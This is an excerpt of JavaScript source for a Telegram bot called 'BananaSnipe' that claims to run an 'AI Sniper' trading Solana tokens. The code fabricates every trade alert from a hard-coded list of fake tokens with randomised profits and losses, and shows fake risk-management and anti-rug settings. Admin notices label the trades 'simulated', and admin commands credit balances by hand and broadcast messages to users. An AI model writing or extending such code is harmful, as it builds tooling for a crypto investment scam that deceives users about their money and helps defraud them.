...
// ─────────────────────────────────────────────
const activeSniper = {}; // userId -> timeoutId

const FAKE_TOKENS = [
  'PEPEKING','SOLCAT','MOONBANA','RUGPROOF','DEGEN42',
  'SHIBSOL','TURBOAPE','GMESOLANA','BONKPLUS','NANOSOL',
  'SOLFROG','GIGACHAD','WIFHAT','POPCAT2','BABYTRUMP',
  'SOLPUMP','NEIRO2','MOODENG','GOAT404','PENGU3',
  'BANANADAO','SOLSLOTH','CHADCOIN','MEMEGOD','ALPHASOL',
];

function rand(min, max) { return Math.random() * (max - min) + min; }
function pickToken() { return FAKE_TOKENS[Math.floor(Math.random() * FAKE_TOKENS.length)]; }

function startSniperSim(userId, chatId) {
  if (activeSniper[userId]) return;

  const scheduleNext = () => {
    // Fire a trade every 2 to 5 minutes
    const delay = Math.floor(rand(2 * 60 * 1000, 5 * 60 * 1000));
    activeSniper[userId] = setTimeout(async () => {
      try {
        const user = db.getUser(String(userId));
        if (!user || !user.sniperActive) return;
        ...
        const betSize = parseFloat(rand(0.05, Math.min(0.35, balance * 0.22)).toFixed(4));
        const pct     = isWin
          ? parseFloat(rand(18, 210).toFixed(1))
          : parseFloat(rand(12, 52).toFixed(1));
        const pnl     = isWin
          ? parseFloat((betSize * pct / 100).toFixed(4))
          : parseFloat(-(betSize * pct / 100).toFixed(4));
        ...
        const emoji = isWin ? '🟢' : '🔴';
        const sign  = isWin ? '+' : '-';
        const label = isWin ? 'PROFIT TAKEN' : 'STOP LOSS HIT';

        const tradeMsg =
`⚡ <b>BANANASNIPE TRADE ALERT</b>

${emoji} <b>${label}</b>

🪙 Token: <b>$${token}</b>
💰 Position Size: <code>${betSize} SOL</code>
📊 Return: <b>${sign}${pct}%</b>
💵 P&amp;L: <b>${sign}${Math.abs(pnl)} SOL</b>

━━━━━━━━━━━━━━━━━━
💼 New Balance: <code>${newBal} SOL</code>
🤖 AI Sniper scanning for next opportunity...`;

        await bot.sendMessage(chatId, tradeMsg, {
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [{ text: '📊 View Dashboard', callback_data: 'dashboard' }, { text: '🔴 Stop Sniper', callback_data: 'deactivate_sniper' }]
            ]
          }
        });

        await notifyAdmin(
          `🤖 <b>Simulated Trade Fired</b>\n👤 @${user.username}\n🆔 <code>${userId}</code>\n\n🪙 $${token} | ${emoji} ${sign}${pct}%\n💵 P&amp;L: ${sign}${Math.abs(pnl)} SOL\n💼 New Balance: ${newBal} SOL`
        );

      } catch (e) {
        console.error('Sim trade error:', e.message);
      }

      const stillActive = db.getUser(String(userId));
      if (stillActive && stillActive.sniperActive) scheduleNext();
...
function stopSniperSim(userId) {
  if (activeSniper[String(userId)]) {
    clearTimeout(activeSniper[String(userId)]);
    delete activeSniper[String(userId)];
  }
}
...
async function safeEdit(chatId, messageId, text, opts) {
  try {
    ...
    catch (e2) { console.error('safeEdit fallback failed:', e2.message); }
  }
}

async function notifyAdmin(text) {
  try { await bot.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'HTML' }); }
...
bot.on('callback_query', async (query) => {
  try {
    ...
    if (data === 'ai_sniper') {
      ...
      const isActive = user.sniperActive || false;
      await safeEdit(chatId, msgId,
        `⚡ <b>AI SNIPER CONFIGURATION</b>\n\n${isActive ? '🟢' : (noFunds ? '🔴' : '🟡')} <b>STATUS: ${isActive ? 'ACTIVE' : (noFunds ? 'STANDBY' : 'READY')}</b>\n\n📊 <b>TRADING PARAMETERS</b>\n💰 Position Size: 1 SOL\n👤 Max Dev Hold: 20%\n⚡ Slippage Tolerance: 10%\n🚀 Priority Fee: 0.001 SOL\n\n🎯 <b>RISK MANAGEMENT</b>\n📈 Take Profit: +100%\n📉 Stop Loss: -30%\n🛡️ Anti-Rug Protection: 🟢 ENABLED\n\n⚙️ <i>Professional-grade automated trading</i>`,
        { reply_markup: { inline_keyboard: [
          [{ text: isActive ? '🔴 DEACTIVATE SNIPER' : '▶️ ACTIVATE SNIPER',
             callback_data: isActive ? 'deactivate_sniper' : (noFunds ? 'need_funds' : 'activate_sniper') }],
    ...
    if (data === 'activate_sniper') {
      db.updateUser(userId, { sniperActive: true });
      startSniperSim(userId, chatId);

      await safeEdit(chatId, msgId,
        `🟢 <b>AI SNIPER ACTIVATED!</b>\n\n⚡ Scanning Solana for opportunities...\n🎯 Monitoring new token launches\n🛡️ Anti-rug filters: ACTIVE\n📊 Risk management: CONFIGURED\n\n<i>You will receive trade alerts as the sniper executes. Sit back and let BananaSnipe do the work! 🍌</i>`,
        { reply_markup: { inline_keyboard: [
          [{ text: '🔴 Deactivate Sniper', callback_data: 'deactivate_sniper' }],
          [{ text: '🏠 Dashboard', callback_data: 'dashboard' }]
        ]}}
      );
      await notifyAdmin(`🎯 <b>AI Sniper ACTIVATED</b>\n👤 @${user.username}\n🆔 <code>${userId}</code>\n💰 Balance: ${(user.balance || 0).toFixed(6)} SOL\n🕐 ${new Date().toLocaleTimeString()}`);
      return;
    }

    // ── DEACTIVATE SNIPER ──
    if (data === 'deactivate_sniper') {
      db.updateUser(userId, { sniperActive: false });
      stopSniperSim(userId);
      user = db.getUser(userId);

      await safeEdit(chatId, msgId,
        `🔴 <b>AI Sniper Deactivated</b>\n\nThe sniper has been stopped. No further trades will be executed.\n\n💼 Final Balance: <code>${(user.balance || 0).toFixed(6)} SOL</code>\n\n💡 You can reactivate anytime from the AI Sniper menu.`,
        { reply_markup: { inline_keyboard: [
          [{ text: '▶️ Reactivate', callback_data: 'activate_sniper' }],
          [{ text: '🏠 Dashboard', callback_data: 'dashboard' }]
        ]}}
      );
      await notifyAdmin(`🛑 <b>AI Sniper DEACTIVATED</b>\n👤 @${user.username}\n🆔 <code>${userId}</code>\n💼 Final Balance: ${(user.balance || 0).toFixed(6)} SOL\n🕐 ${new Date().toLocaleTimeString()}`);
      return;
    }
  ...
  try {
    ...
    if (isAdmin(userId)) {
      ...
      if (text.startsWith('/credit')) {
        ...
        if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Usage: /credit {UserID} {SOL}\nExample: /credit 123456789 5.5'); return; }
        ...
        if (!targetUser) { await bot.sendMessage(chatId, `❌ User ${targetId} not found.`); return; }
      ...
      if (text.startsWith('/broadcast')) {
        ...
        for (const u of users) {
          try { await bot.sendMessage(u.userId, `📢 <b>BananaSnipe:</b>\n\n${message}`, { parse_mode: 'HTML' }); sent++; }
          catch (_) { failed++; }
        }
      ...
      if (text.startsWith('/prompt')) {
        ...
        } catch (_) { await bot.sendMessage(chatId, `❌ Could not send to ${targetId}`); }
        return;
      }

      if (text === '/users') {
        const users = db.getAllUsers();
        if (users.length === 0) { await bot.sendMessage(chatId, '👥 No users yet.'); return; }
        // Split into chunks of 30 to avoid message too long
        const chunkSize = 30;
        for (let i = 0; i < users.length; i += chunkSize) {
          const chunk = users.slice(i, i + chunkSize);
          let out = i === 0 ? `👥 <b>All Users (${users.length} total)</b>\n\n` : `<b>...continued</b>\n\n`;
          for (const u of chunk) {
            const sniper = u.sniperActive ? '🟢' : '⚪';
            out += `${sniper} 👤 @${u.username} | <code>${u.userId}</code> | 💰 ${(u.balance || 0).toFixed(4)} SOL\n`;
          }
